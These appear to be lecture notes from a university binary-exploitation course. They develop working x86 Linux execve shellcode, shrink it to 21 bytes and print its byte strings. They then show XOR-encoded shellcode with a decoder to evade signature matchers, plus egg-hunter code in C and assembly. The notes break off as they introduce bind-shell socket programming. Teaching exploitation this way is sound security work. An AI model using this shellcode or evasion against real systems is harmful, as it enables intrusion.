# Unit 4: Shell Code Variations

# Reducing the Size of Shell Code

Shell code has three main properties: (1) it executes a system call to
open a shell or do some other action; (2) it does not contain null
bytes; and (3), it is small. So far, the shell code we've developed is
37 bytes. Let's review that piece of shell code now:

``` asm
;;long_shell.asm
SECTION .text           ; Code section
            global _start   ; Make label available to linker

_start:             ; Standard ld entry point

     jmp callback       ; Jump to the end to get our current address

dowork:
     pop esi        ; esi now holds the address of "/bin/sh"

     xor edx,edx        ; edx = 0 (it's also param #3 - NULL)
     push edx       ; args[1] - NULL
     push esi       ; args[0] - "/bin/sh"

     mov ecx,esp        ; Param #2 - address of args array
     mov ebx,esi        ; Param #1 - "/bin/sh"
     xor eax,eax        ; eax = 0
     mov al,0xb         ; System call number for execve
     int 0x80       ; Interrupt 80 hex - invoke system call

     xor ebx,ebx        ; Exit code, 0 = normal
     xor eax,eax        ; eax = 0
     inc eax        ; System call number for exit (1)
     int 0x80       ; Interrupt 80 hex - invoke system call

callback:
     call dowork        ; Pushes the address of "/bin/sh" onto the stack
     db "/bin/sh",0     ; The program we want to run - "/bin/sh"
```

To see it's current size, let's compile and use the hexify program to
count the number of bytes:

``` example
user@si485H-base:demo$ nasm -g -f elf -o long_shell.o long_shell.asm
user@si485H-base:demo$ ld  -o long_shell long_shell.o
user@si485H-base:demo$ ./hexify.sh long_shell
\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00
user@si485H-base:demo$ printf `./hexify.sh long_shell` | wc -c
37
```

That may seem ok: 37 bytes is pretty short. We can do better, though,
because the shorter the shell code the more easily we can drop it as a
payload.

## Using the Stack More Effectively

Our first target for reducing the size the shell code is to remove the
jmp-call back procedures. Let's look at the objdump of the code to see
how many bytes are used:

``` example
08048060 <_start>:
 8048060: eb 16                 jmp    8048078 <callback>

08048062 <dowork>:
 8048062: 5e                    pop    esi
 8048063: 31 d2                 xor    edx,edx
 8048065: 52                    push   edx
 8048066: 56                    push   esi
 8048067: 89 e1                 mov    ecx,esp
 8048069: 89 f3                 mov    ebx,esi
 804806b: 31 c0                 xor    eax,eax
 804806d: b0 0b                 mov    al,0xb
 804806f: cd 80                 int    0x80
 8048071: 31 db                 xor    ebx,ebx
 8048073: 31 c0                 xor    eax,eax
 8048075: 40                    inc    eax
 8048076: cd 80                 int    0x80

08048078 <callback>:
 8048078: e8 e5 ff ff ff        call   8048062 <dowork>
 804807d: 2f                    das    
 804807e: 62 69 6e              bound  ebp,QWORD PTR [ecx+0x6e]
 8048081: 2f                    das    
 8048082: 73 68                 jae    80480ec <callback+0x74>
```

If you look closely at the `call` instruction, you see that this takes 5
whole bytes! That's simply too many. Let's look for a way to reduce
this.

### Attempt 1

Let's try the strategy where we push all the bytes of the "/bin/sh" onto
the stack, one-by-one, and then the stack pointer will be the address of
the start of the string. Something like this:

``` asm
;;; push_shell_1.asm
SECTION .text           ; Code section
             global _start  ; Make label available to linker
_start:
     xor eax,eax

     push eax       ;\0
     push 0x68      ;h
     push 0x73          ;s
     push 0x2f          ;/
     push 0x6e          ;n
     push 0x69          ;i
     push 0x62          ;b
     push 0x2f          ;/

     mov esi,esp        ; esp is address of "/bin/sh"

     xor edx,edx        ; edx = 0 (it's also param #3 - NULL)
     push edx       ; args[1] - NULL
     push esi       ; args[0] - "/bin/sh"


     mov ecx,esp        ; Param #2 - address of args array
     mov ebx,esi        ; Param #1 - "/bin/sh" is *esp
     mov al,0xb         ; System call number for execve
     int 0x80       ; Interrupt 80 hex - invoke system call

     xor ebx,ebx        ; Exit code, 0 = normal
     xor eax,eax        ; eax = 0
     inc eax        ; System call number for exit (1)
     int 0x80       ; Interrupt 80 hex - invoke system call
```

Looking at this, we get the same effect of the jmp-call back to get a
position free reference to the string "/bin/sh". Let;s take a look at
the objdump to see how this changed things:

``` example
Disassembly of section .text:

08048060 <_start>:
 8048060:   31 c0                   xor    eax,eax
 8048062:   50                      push   eax
 8048063:   6a 68                   push   0x68
 8048065:   6a 73                   push   0x73
 8048067:   6a 2f                   push   0x2f
 8048069:   6a 6e                   push   0x6e
 804806b:   6a 69                   push   0x69
 804806d:   6a 62                   push   0x62
 804806f:   6a 2f                   push   0x2f
 8048071:   89 e6                   mov    esi,esp
 8048073:   31 d2                   xor    edx,edx
 8048075:   52                      push   edx
 8048076:   56                      push   esi
 8048077:   89 e1                   mov    ecx,esp
 8048079:   89 f3                   mov    ebx,esi
 804807b:   b0 0b                   mov    al,0xb
 804807d:   cd 80                   int    0x80
 804807f:   31 db                   xor    ebx,ebx
 8048081:   31 c0                   xor    eax,eax
 8048083:   40                      inc    eax
 8048084:   cd 80                   int    0x80
```

Looking closely, there are two bytes for every push, and we push 7
items, for 14 bytes. Referring back to the jmp-callback version of the
code. There were 12 bytes for the call back and 2 bytes for the jmp,
that's 14 byts. We gained nothing!

Worse, let's see if this shell code actually works:

``` example
user@si485H-base:demo$ ./push_shell_1 
user@si485H-base:demo$ 
```

Fail.

To figure out why this shell code doesn't work, we'll have to trace its
execution in gdb.

``` example
user@si485H-base:demo$ gdb -q push_shell_1 
Reading symbols from push_shell_1...done.
(gdb) b _start
Breakpoint 1 at 0x8048060
(gdb) r
Starting program: /home/user/git/si485-binary-exploits/lec/12/demo/push_shell_1 

Breakpoint 1, 0x08048060 in _start ()
(gdb) ds
Dump of assembler code for function _start:
=> 0x08048060 <+0>: xor    eax,eax
   0x08048062 <+2>: push   eax
   0x08048063 <+3>: push   0x68
   0x08048065 <+5>: push   0x73
   0x08048067 <+7>: push   0x2f
   0x08048069 <+9>: push   0x6e
   0x0804806b <+11>:    push   0x69
   0x0804806d <+13>:    push   0x62
   0x0804806f <+15>:    push   0x2f
   0x08048071 <+17>:    mov    esi,esp
   0x08048073 <+19>:    xor    edx,edx
   0x08048075 <+21>:    push   edx
   0x08048076 <+22>:    push   esi
   0x08048077 <+23>:    mov    ecx,esp
   0x08048079 <+25>:    mov    ebx,esi
   0x0804807b <+27>:    mov    al,0xb
   0x0804807d <+29>:    int    0x80
   0x0804807f <+31>:    xor    ebx,ebx
   0x08048081 <+33>:    xor    eax,eax
   0x08048083 <+35>:    inc    eax
   0x08048084 <+36>:    int    0x80
End of assembler dump.
(gdb) x/3x $esp
0xbffff720: 0x00000001  0xbffff847  0x00000000
```

Looking at the stack at this point, things seem to be going okay. Let's
take three steps:

``` example
(gdb) ni 3
0x08048065 in _start ()
(gdb) ds
Dump of assembler code for function _start:
   0x08048060 <+0>: xor    eax,eax
   0x08048062 <+2>: push   eax
   0x08048063 <+3>: push   0x68
=> 0x08048065 <+5>: push   0x73
   0x08048067 <+7>: push   0x2f
   0x08048069 <+9>: push   0x6e
   0x0804806b <+11>:    push   0x69
   0x0804806d <+13>:    push   0x62
   0x0804806f <+15>:    push   0x2f
   0x08048071 <+17>:    mov    esi,esp
   0x08048073 <+19>:    xor    edx,edx
   0x08048075 <+21>:    push   edx
   0x08048076 <+22>:    push   esi
   0x08048077 <+23>:    mov    ecx,esp
   0x08048079 <+25>:    mov    ebx,esi
   0x0804807b <+27>:    mov    al,0xb
   0x0804807d <+29>:    int    0x80
   0x0804807f <+31>:    xor    ebx,ebx
   0x08048081 <+33>:    xor    eax,eax
   0x08048083 <+35>:    inc    eax
   0x08048084 <+36>:    int    0x80
End of assembler dump.
(gdb) x/3x $esp
0xbffff718: 0x00000068  0x00000000  0x00000001
```

Ok. Now we have sense of what is going on. Looking closely, you can see
that when we pushed 0x68, we didn't push just the byte of 0x68, we push
the 4-byte value of 0x00000068. Why?

The stack is always 4-byte aligned. This is to ensure that when you push
and pop, you get consistent answers. The thing that you push onto the
stack is always popped off the stack. There is no way to push single
bytes. It doesn't allow you to get out of alignment, so you must ALWAYS
push 4-byte values. But, we can work with that.

### Attempt 2

Now that we are a bit more familiar with the stack, we can change our
shell code to push the entire byte sequence for "/bin/sh" in two steps.

Problem: "/bin/sh" is 7 bytes long, and we can only push 4 byte
sequences! This can be solved with leveraging the file system path
constructs. For example, "//bin/sh" is the same as "/bin//sh" which is
the same as "/bin/sh".

With that, we have the following shell code:

``` asm
SECTION .text           ; Code section
             global _start  ; Make label available to linker
_start:
    xor eax,eax
    push eax        ;\0
    push 0x68732f6e     ;n/sh
    push 0x69622f2f     ;//bi 

    mov esi,esp         ;esp is argv

    xor edx,edx         ; edx = 0 (it's also param #3 - NULL)
    push edx        ; args[1] - NULL
    push esi        ; args[0] - "/bin/sh"


    mov ecx,esp         ; Param #2 - address of args array
    mov ebx,esi         ; Param #1 - "/bin/sh" is *esp
    mov al,0xb          ; System call number for execve
    int 0x80        ; Interrupt 80 hex - invoke system call

    xor ebx,ebx         ; Exit code, 0 = normal
    xor eax,eax         ; eax = 0
    inc eax         ; System call number for exit (1)
    int 0x80        ; Interrupt 80 hex - invoke system call
```

Looking closely at the two push commands, we have to be mindful of the
order and little-endian.

``` asm
    push 0x68732f6e     ;n/sh
    push 0x69622f2f     ;//bi 
```

Note first that the last thing pushed on the stack would be the start of
the string sequence. The byte 0x2f is '/', and looking closely at the
bytes, you see that the number 0x69622f2f is "ib//" which when reversed
in little endian storage, becomes "//bi."

Finally, we still have to NULL terminate the string, so we push onto the
stack first zero byte. When it is all said and done, we get the
following:

``` example
       | 0x0 0x0 0x0 0x0 | 0x00000000
       | 'n' '/' 's' 's' | 0x68732f6e
 esp-> | '/' '/' 'b' 'i' | 0x69622f2f
       '-----------------'
```

And, we can now use the value of `esp` as the start of the "/bin/sh\\0"
string.

Let's compile and see if this works:

``` example
user@si485H-base:demo$ ld  -o push_shell_2 push_shell_2.o
user@si485H-base:demo$ ./push_shell_2 
$ echo "It worked!"
It worked!
$ 
```

And, we can see how many bytes it is:

``` example
user@si485H-base:demo$ printf `./hexify.sh push_shell_2` | wc -c
34
```

Woohoo! We saved 3 bytes.

## Removing Crud from the Shell Code

The next place to turn our frugal eyes upon is the extra bit of crud in
the shell code. In particular, let's start by removing the `exit` system
call. Why do we need to exit cleanly from our shell code if we fail to
execve? Who cares? We are trying to bring down the systems and a bit of
segfaulting here and there is ok by me.

The second item we want to focus on is the `execve()` call itself. It
turns out that you don't need to do quite as much work for the shell to
execute. Consider this small example program:

``` c
/*small_execve.c*/

#include <unistd.h>

int main(){
  execve("/bin/sh",NULL,NULL);
}
```

Notice, in this is `execve` call there is no `argv` array. We just leave
this NULL, which is not preferred but still works. Essentially, you are
indicating that you do not want any arguments at all, but `execve` is
smart enough to fix this for you later. In fact, running this program
works fine:

``` example
user@si485H-base:demo$ gcc small_execve.c   -o small_execve
small_execve.c: In function ‘main’:
small_execve.c:4:3: warning: null argument where non-null required (argument 2) [-Wnonnull]
   execve("/bin/sh",NULL,NULL);
   ^
user@si485H-base:demo$ ./small_execve 
$ echo "It Works!"           
It Works!
$ 
```

Yes, the compiler complains, but who cares if it works.

With these changes, we are left with the following shell code:

``` asm
;;smaller_shell.asm
SECTION .text           ; Code section
             global _start  ; Make label available to linker
_start:
    xor eax,eax
    push eax        ;\0
    push 0x68732f6e     ;n/sh
    push 0x69622f2f     ;//bi 

    xor edx,edx        ; Parm #3 - NULL
    xor ecx,ecx        ; Param #2 - NULL
    mov ebx,esp         ; Param #1 - "/bin/sh" is *esp
    mov al,0xb          ; System call number for execve
    int 0x80        ; Interrupt 80 hex - invoke system call
```

And we can compile and test:

``` example
user@si485H-base:demo$ nasm -f elf smaller_shell.asm -o smaller_shell.o
user@si485H-base:demo$ ld smaller_shell.o -o smaller_shell
user@si485H-base:demo$ ./smaller_shell 
$ echo "It Works!"    
It Works!
$ 
user@si485H-base:demo$ printf `./hexify.sh smaller_shell` | wc -c
23
```

Now we are at 23 bytes! Wow, but believe it or not, we can still do 2
bytes better.

## Zeroing Out Better

The last place to gain an advantage, and it is a small one is in the
process of zeroing bytes. There are a number of instructions that are
designed to deal with 8-byte arithmetic by using multiple registers to
store the results of values that overflow 4-byte numbers. The
instruction we will concern ourselves with is the `mul` instruction.

The `mul` instruction has the following form:

``` example
   mul reg
```

It will:

-   Multiple the value in `reg` with the value currently in `eax`
-   The result will be stored with the lower 4-bytes in `eax` and the
    upper 4-bytes in `edx`

What does this imply? Well, if we multiple where the value in the
registers is zero, then `eax` will be zero AND `edx` will be zero. The
`mul` instruction is just two bytes, and using that two bytes, we can do
two zero'ing, saving us two bytes overall.

Here's the resulting shell code:

``` asm
;; smallest_shell.asm
SECTION .text           ; Code section
             global _start  ; Make label available to linker
_start:
    xor ecx,ecx
    mul ecx         ;0's edx and and eax
    push eax        ;\0
    push 0x68732f6e     ;n/sh
    push 0x69622f2f     ;//bi 


    mov ebx,esp         ; Param #1 - "/bin/sh" is *esp
    mov al,0xb          ; System call number for execve
    int 0x80        ; Interrupt 80 hex - invoke system call
```

If you look at the two instructions at the top:

``` asm
    xor ecx,ecx
    mul ecx 
```

First, by zeroing out `ecx`, and then doing `mul ecx`, we multiple the
value in `eax` by zero and store zero in both `eax` and `edx`.

We can show that this shell code does work and see how many bytes it is:

``` example
user@si485H-base:demo$ nasm -f elf smallest_shell.asm -o smallest_shell.o
user@si485H-base:demo$ ld smallest_shell.o -o smallest_shell
user@si485H-base:demo$ ./smallest_shell 
$ echo "It Works!"
It Works!
$ 
user@si485H-base:demo$ printf `./hexify.sh smallest_shell` | wc -c
21
```

We are now at 21 bytes! And, that's about as small as it can get. I
haven't seen any examples much smaller than this that work consistently.

# Shell Code Hiding

## Signature Matching Defenses

Continuing our discussion of advanced shell code. In the last class we
reduced the size of our shell code from 37 bytes to 21, but sometimes it
is not the size of the shell code, but the content. For example, modern
intrusion detection systems may scan the contents of program for
"/bin/sh" or even "sh" to try and stop shell code. Here's a really
simple example code:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char * argv[]){

  if(argc < 2){
    printf("ERROR: Require argument\n");
    exit(1);
  }

  char * p;
  for(p=argv[1];*p;p++){

    //check for any "sh" so not to be exploited!
    if (strncmp(p,"sh",2) == 0){
      printf("No way Jose!\n");
      exit(2);
    }
  }

  //execute as binary code
  ((void(*)(void)) argv[1])();

  return;
}
```

This code will balk whenever the input string contains the word "sh" as
needed for our shell code.

As you can see, in our 21 byte shell code, we are going to have a
problem getting passed the signature:

``` example
user@si485H-base:demo$ ./sig_matcher $(printf `./hexify.sh smallest_shell`)
No way Jose!
```

This is a toy example, but such a program could compare against any kind
of input type to match shell code. This is called *signature matching*
and it is a common defense to prevent exploits. Here's a more complex
signature matching scheme:

``` c
user@si485H-base:demo$ cat execve_sigmatcher.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


//check for the sig0 start finished by sig1 in str
int check_sig(char *str, char * sig0,char *sig1){

  char *p,*q;

  for(p=str;*p;p++){

    //checking for start of signature
    if ( strncmp(p,sig0,strlen(sig0)) == 0 ){

      //checking for end of signature
      for(q=p;*q;q++){
    if (strncmp(q,sig1,strlen(sig1)) == 0){
      return 1;//found signature
    }
      }
    }
  }

  return 0; //did not find signautre


}

int main(int argc, char * argv[]){

  if(argc < 2){
    printf("ERROR: Require argument\n");
    exit(1);
  }

  //                      mov al,0xb   int 0x80
  if ( check_sig(argv[1], "\xb0\x0b", "\xcd\x80") ||
       //                xor ecx,ecx  int 0x80
       check_sig(argv[1], "\x31\xc9", "\xcd\x80")){

    printf("No Way Jose!\n");
    exit(2);
  }

  //execute as binary code
  ((void(*)(void)) argv[1])();

  return;
}
```

In this scheme, the signature is looking for some possibly shell code
indicative instruction, like `mov al, 0xb` or `xor ecx,ecx` which is
followed by an `int 0x80` at some point later. This signature is,
clearly, a lot harder to defeat with the shell code we've been using so
far. What to do?!

## Obfuscating Shell Code

In the community, it is generally considered that signature matching
schemes can be easily defeated with *obfuscated* and *polymorphic* shell
code. In these variants, the shell code is some how changed dynamically
such that it will pass a signature matching scheme.

We will focus on simple obfuscated shell code scheme which will encode
the shell code portion the program and then use a decoder to decode the
shell code prior to execution. You can imagine expanding this scheme to
polymorphic shell code, where by each version of the shell code changes
... but that might be a discussion for another day (or year).

### Simple Push Based Obfuscation

To start, let's make the observation that we can rewrite our shell code
for our 21 byte shell code using a series of push commands followed by a
call to `esp` (or a jmp).

Here are the bytes to our small shell code from objdump:

``` example
8048060:    31 c9                   xor    ecx,ecx
 8048062:   f7 e1                   mul    ecx
 8048064:   50                      push   eax
 8048065:   68 6e 2f 73 68          push   0x68732f6e
 804806a:   68 2f 2f 62 69          push   0x69622f2f
 804806f:   89 e3                   mov    ebx,esp
 8048071:   b0 0b                   mov    al,0xb
 8048073:   cd 80                   int    0x80
```

First, I want to conver this into little-endian encode 4-byte sequences
that I can push onto the stack. I've written a script to do this
`le-fourbyte.py` and is provided in the classed tools directory. Here's
an example of using it on this shell code:

``` example
user@si485H-base:demo$ printf $(./hexify.sh smallest_shell) | ./le-fourbytes.py -
0xe1f7c931
0x2f6e6850
0x2f686873
0x8969622f
0xcd0bb0e3
0x90909080
```

As you can see, if you look closely, that all the bytes are there
encoded into little endian.

Now, to use this in another version of the shell code, we will want push
in reverse order, and we can use the `tac` command (`cat` backwards) to
print this in reverse:

``` example
user@si485H-base:demo$ printf $(./hexify.sh smallest_shell) | ./le-fourbytes.py - | tac
0x90909080
0xcd0bb0e3
0x8969622f
0x2f686873
0x2f6e6850
0xe1f7c931
```

And, then we can dump this into some shell code:

``` asm
;;;push_shell.asm
section .text
    global _start
_start: 
    push 0x90909080
    push 0xcd0bb0e3
    push 0x8969622f
    push 0x2f686873
    push 0x2f6e6850
    push 0xe1f7c931
    call esp
```

And now, we pass the simple sigchecks from before because we split up
the `int 0x80` instruction bytes.

``` example
user@si485H-base:demo$ ./execve_sigmatcher $(printf `./hexify.sh push_shell`)
$
```

But, surprisingly, we still fail the more naive checking for "sh"

``` example
user@si485H-base:demo$ ./simple_sigmatcher $(printf `./hexify.sh push_shell`)
No way Jose!
```

We need to do a bit more work.

### Decoder Obfuscated Shell Code

The next step in obfuscation is to actually encode the bytes of the
shell code in some way, push them onto the stack, and then decode them
at run time. We will use a very basic encoding scheme that will `xor`
the bytes with a key. It's important that the key does not exist in the
shell code, otherwise we may introduce a null byte.

I don't see any 0xFF in the shell code, so we will use that as the key,
essentially inverting the bytes. The `le-fourbytes.py` script will do
this too:

``` example
user@si485H-base:demo$ printf $(./hexify.sh smallest_shell) | ./le-fourbytes.py - 0xFF | tac
0x6f6f6f7f
0x32f44f1c
0x76969dd0
0xd097978c
0xd09197af
0x1e0836ce
```

That looks good. Now, all we need to do is write a decoder in assembly
that will step through and invert all the bytes on the stack before
calling `esp`.

``` asm
SECTION .text
    global _start

_start:
    ;; push encoded shell code
    push 0x6f6f6f7f
    push 0x32f44f1c
    push 0x76969dd0
    push 0xd097978c
    push 0xd09197af
    push 0x1e0836ce     ;24=6*4 bytes long


    ;; DECODER

    xor eax,eax,        ;zero out eax
    xor ecx,ecx     ;zerp out ecx
    mov cl,0x18         ;set ecx to 24, length of shell code
decode:
    mov al,[esp+ecx-1]  ;load byte at front int al
    xor al,0xff     ;decode byte
    mov [esp+ecx-1],al  ;write byte back
    loop decode     ;decrement ecx and jmp to decode until ecx is zero

        call esp                ;call esp to execute shell code
```

There are few new assembly instructions, but most should be familiar.
The new instruction is `loop`, which will do an condition jump based on
the value of `ecx` register and also decrement `ecx`. Once `ecx` is
zero, it will no longer jump.

In total, this shell code is one part pushing on the encoded shell code
and one part decoding that shell code. Once the shell code is decoded,
we can call `esp` and execute the shell code.

``` example
user@si485H-base:demo$ ./encoded_shell 
$
```

And this will pass all our signature matchers:

``` example
user@si485H-base:demo$ ./simple_sigmatcher $(printf `./hexify.sh encoded_shell`)
$ 
user@si485H-base:demo$ ./execve_sigmatcher $(printf `./hexify.sh encoded_shell`)
$
```

But, you might be thinking, wait, couldn't write signatures that match
the decoder? Of course, but then we can write more obfuscated decoders,
and then they can write signatures for that, and we obfuscate again, and
then more signatures, etc. This is why a signature scheme will always
fail in the long run.

## Egg-Hunt Shell Code

Let's consider another technique for subverting signature matching
scheme called the *egg hunt*. In the egg hunt, we consider a scenario
where we can't easily upload our shell code in a way that will execute.
This could occur because either there isn't enough space in the overflow
buffer for the shell code, or that there are good signature matching
schemes in place. Either way, we are currently hosed in getting our
shell code to execute directly.

However, all may not be loss. Even if we can't get our shell code to
execute, we may be able to get it into the memory address space of the
program and get some other piece of code to execute for the buffer
overrun, one that fits in the buffer or doesn't match a current
signature. The challenge now is, how do we eventually execute our shell
code? And, more precisely, how do we find it in memory?

This is the so called "egg hunt!" What we can do is plant an egg in our
shell code, and have another piece of software search the *entire*
memory address space searching for it.

### Determining a Good Egg

A good egg should have two properties: (1) it should consist of `nop`
like instructions so that it doesn't affect the shell code, and (2), it
should be doubled.

For the first, a typical egg that we will use is 0x50905090. You'll
notice that byte 0x90 is a nop, and 0x50 is `incr eax` so essentially a
nop. This is a nice egg because once we find the egg, we want to jmp to
that execution.

The other important part of an egg, is that it must apear twice. For
example, here is are huntable shell code:

``` asm
;;; huntable_shell.asm
SECTION .text           ; Code section
             global _start  ; Make label available to linker
_start:
    db 0x50,0x90,0x50,0x90  ; egg target
    db 0x50,0x90,0x50,0x90
    xor ecx,ecx
    mul ecx         ;0's edx and and eax
    push eax        ;\0
    push 0x68732f6e     ;n/sh
    push 0x69622f2f     ;//bi 


    mov ebx,esp         ; Param #1 - "/bin/sh" is *esp
    mov al,0xb          ; System call number for execve
    int 0x80        ; Interrupt 80 hex - invoke system call
```

The reason it must apear in duplicate is that the egg hunt shell code
must also have a copy of the egg because it will be using it in a
comparison. Thus, to differentiate the egg hunter from its pray, the
pray has the egg twice.

### How to Hunt and Egg

With the egg figured out and our huntable shell code, let's focus our
attention on the egg unter. For this, we need two processes:

1.  We need to be able to iterate through the entire memory address
    space, from 0x0000000 to 0xFFFFFFFFF, FAST!

2.  We need to be able to see if an address can be dereferenced without
    causing a segmentation fault.

For (1), we need to think about how memory is aligned. Each memory
region is broken into pages, and pages are bounded by 1024 bytes. This
means that we jump by 1024 bytes for each address if the address is not
referenced.

For (2), this is a bit more tricky. We can't just dereference the
address ourselves because that will cause a `segfault`, but we might be
able to ask the operating system to check. The `access()` system call is
exactly the right tool for this job.

Normally, `access` will check if you have access to the specified file.
Here' is the manual description:

``` example
SYNOPSIS
       #include <unistd.h>

       int access(const char *pathname, int mode);

DESCRIPTION
       access() checks whether the calling process can access the file pathname.  
       If pathname is a symbolic link, it is dereferenced.
```

We hand it a path name as a reference to a string, an address, and the
operating system will dereference that address. If the address is not
accesible, the system call will fail with `EFAULT`

``` example
EFAULT pathname points outside your accessible address space.
```

BUT, it will not segfault! So we can use `access()` to hunt out
accessible address spaces. Here's some C code that does that, and once
it finds the egg, it executes it.

``` c
//dummy_hunt.c
#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main(int argc, char *argv[]){

  unsigned int p = 0x0000000;
  unsigned int egg = 0x90509050;

  //egg hunt
  while(1){

    //peform an acess
    access( (char *) p+4, 0);
    //check if we EFAULT or not (readible memory or not)
    if ( errno != EFAULT){

      //treat p as a integer pointer
      unsigned int * q = (unsigned int *) p;

      //check for egg twice in a row
      if (q[0] == 0x90509050 &&
      q[1] == 0x90509050){
    //execute the shell code if found
    ((void(*)(void)) q)();
      }

      p++;
    }else{
      //if segfaulting move at page boundry
      p |= 0xfff; //1 out last 12 bits, 
      p += 1; //add 1 to cause an overflow to move in 4096 boundaries
    }

  }


}
```

And if we run this dummy code like so:

``` example
user@si485H-base:demo$ ./dummy_hunt $(printf $(./hexify.sh huntable_shell))
```

The huntable<sub>shell</sub> is a command line argument, which means it
is loaded into the memory of the program. The egg hunter will find the
shell code, eventually, and drop us into the shell. How long does it
take?

``` example
user@si485H-base:demo$ time ./dummy_hunt $(printf $(./hexify.sh huntable_shell)) < /dev/null

real    0m9.038s
user    0m0.628s
sys 0m6.568s
```

That long. Which is pretty fast, but not soo fast.

### Putting it all together

Ok, now that we have a sense of how to hunt an egg, let's translate that
logic into assembly and write an egg hunt shell code:

``` asm
SECTION .text
    global _start

_start:
    mov ebx, 0x90509050 ;store value of egg
    xor ecx,ecx     ;clear registers ecx
    mul ecx         ;clear register edx,eax

j1: or dx,0xfff     ;move in page boundaries by 4096 byte boundaries

j2: inc edx,        ; move by 1

    pusha           ;save registers on stack
    lea ebx,[edx+0x4]   ;load address 4 bytes for ebx
    mov al,0x21     ;set up access()
    int 0x80        ;system call

    cmp al,0xf2     ;compare to -14 EFAULT
    popa            ;restore register state from stack

    jz j1           ;if EFAULT, move in page boundary

    cmp [edx],ebx       ;check for first egg
    jnz j2          ;jump if not there

    cmp [edx+0x4],ebx   ;check for second egg
    jnz j2          ;jump if not there

    jmp edx         ;found egg, jump to egg
```

Now, we can use our dummy exploit, with our egg hunt shell code and our
huntable shell code to see it work together:

``` example
./dummy_exploit $(printf $(./hexify.sh egg_hunt)) $(printf $(./hexify.sh huntable_shell))
```

The first argument will be executed by the dummy<sub>exploit</sub>
program, which will find the huntable shell code, the second argument.
How long does it take?

``` example
user@si485H-base:demo$ time ./dummy_exploit $(printf $(./hexify.sh egg_hunt)) $(printf $(./hexify.sh huntable_shell)) < /dev/null

real    0m10.775s
user    0m1.776s
sys 0m7.192s
```

Notice, most of that is the system call. And, if you run this with
strace, you can see that happening.

``` example
user@si485H-base:demo$  strace -e raw=access ./dummy_exploit $(printf $(./hexify.sh egg_hunt)) $(printf $(./hexify.sh huntable_shell))
ccess(0x8ed2004, 0)                    = -1 (errno 14)
access(0x8ed3004, 0)                    = -1 (errno 14)
access(0x8ed4004, 0)                    = -1 (errno 14)
access(0x8ed5004, 0)                    = -1 (errno 14)
access(0x8ed6004, 0)                    = -1 (errno 14)
access(0x8ed7004, 0)                    = -1 (errno 14)
access(0x8ed8004, 0)                    = -1 (errno 14)
access(0x8ed9004, 0)                    = -1 (errno 14)
access(0x8eda004, 0)                    = -1 (errno 14)
access(0x8edb004, 0)                    = -1 (errno 14)
access(0x8edc004, 0)                    = -1 (errno 14)
access(0x8edd004, 0)                    = -1 (errno 14)
access(0x8ede004, 0)                    = -1 (errno 14)
access(0x8edf004, 0)                    = -1 (errno 14)
access(0x8ee0004, 0)                    = -1 (errno 14)
access(0x8ee1004, 0)                    = -1 (errno 14)
access(0x8ee2004, 0)                    = -1 (errno 14)
access(0x8ee3004, 0)                    = -1 (errno 14)
access(0x8ee4004, 0)                    = -1 (errno 14)
access(0x8ee5004, 0)                    = -1 (errno 14)
access(0x8ee6004, 0)                    = -1 (errno 14)
access(0x8ee7004, 0)                    = -1 (errno 14)
access(0x8ee8004, 0)                    = -1 (errno 14)
access(0x8ee9004, 0)                    = -1 (errno 14)
access(0x8eea004, 0)                    = -1 (errno 14)
access(0x8eeb004, 0)                    = -1 (errno 14)
access(0x8eec004, 0)                    = -1 (errno 14)
(...)
```

Pausing ... this is moving at the page boundary, every 4096 bytes. This
region of memory is not accessible, but eventually ...

``` example
(...)
ccess(0xb7e38d2c, 0)                   = -1 (errno 2)
access(0xb7e38d2d, 0)                   = -1 (errno 2)
access(0xb7e38d2e, 0)                   = -1 (errno 2)
access(0xb7e38d2f, 0)                   = -1 (errno 2)
access(0xb7e38d30, 0)                   = -1 (errno 2)
access(0xb7e38d31, 0)                   = -1 (errno 2)
access(0xb7e38d32, 0)                   = -1 (errno 2)
access(0xb7e38d33, 0)                   = -1 (errno 2)
access(0xb7e38d34, 0)                   = -1 (errno 2)
access(0xb7e38d35, 0)                   = -1 (errno 2)
access(0xb7e38d36, 0)                   = -1 (errno 2)
access(0xb7e38d37, 0)                   = -1 (errno 2)
access(0xb7e38d38, 0)                   = -1 (errno 2)
access(0xb7e38d39, 0)                   = -1 (errno 2)
access(0xb7e38d3a, 0)                   = -1 (errno 2)
access(0xb7e38d3b, 0)                   = -1 (errno 2)
access(0xb7e38d3c, 0)                   = -1 (errno 2)
access(0xb7e38d3d, 0)                   = -1 (errno 2)
access(0xb7e38d3e, 0)                   = -1 (errno 2)
access(0xb7e38d3f, 0)                   = -1 (errno 2)
access(0xb7e38d40, 0)                   = -1 (errno 2)
access(0xb7e38d41, 0)                   = -1 (errno 2)
access(0xb7e38d42, 0)                   = -1 (errno 2)
access(0xb7e38d43, 0)                   = -1 (errno 2)
access(0xb7e38d44, 0)                   = -1 (errno 2)
access(0xb7e38d45, 0)                   = -1 (errno 2)
access(0xb7e38d46, 0)                   = -1 (errno 2)
access(0xb7e38d47, 0)                   = -1 (errno 2)
access(0xb7e38d48, 0)                   = -1 (errno 2)
(...)
```

You get a region of memory that is accessible, and then you move 1 byte
at a type through it checking for the egg. Finally, at some point you
find that egg, and you eat it ---- I mean you execute the shell.

# C Based Remote Shells

## Socket Programming in C

This lesson is all about writing shell code that create a listening port
on the remote machine that when connected to, provides shell access to
the exploited host. This requires us to recall how to do socket
programming in C, which can be a pain.

For this lesson, we focus only on the server side, but you'll have to do
some client side work for your labs...

### =socket()=

First, a socket in C is just like any other file descriptor --- it has
an assigned number reference for the file descriptor table. To open a
new socket, we use the socket system call:

``` c
int socket(int domain, int type, int protocol);
```

The domain of the socket describes the kind of socket we are using. This
could be a Unix socket which is used for in-host communication, or it
could be IPv4 socket or a IPv6 socket. In general, we are going to be
using IPv4 sockets: `AF_INET` or `PF_INET` depending on the system.

Next the type describes what high-level protocol should be used to
communicate on the socket. The two main varieties for types is
`SOCK_STREAM` for `TCP/IP` sockets and `SOCK_DGRAM` for `UDP` sockets.
Remote shells need reliable, session based communication, and thus we
will use SOCK<sub>STREAM</sub>.

Finally the protocol refers to type specific protocol settings: We will
not use this and set this value to 0.

The return value from socket is an integer which is a reference to the
file descriptor table. At this point, the socket is not really ready to
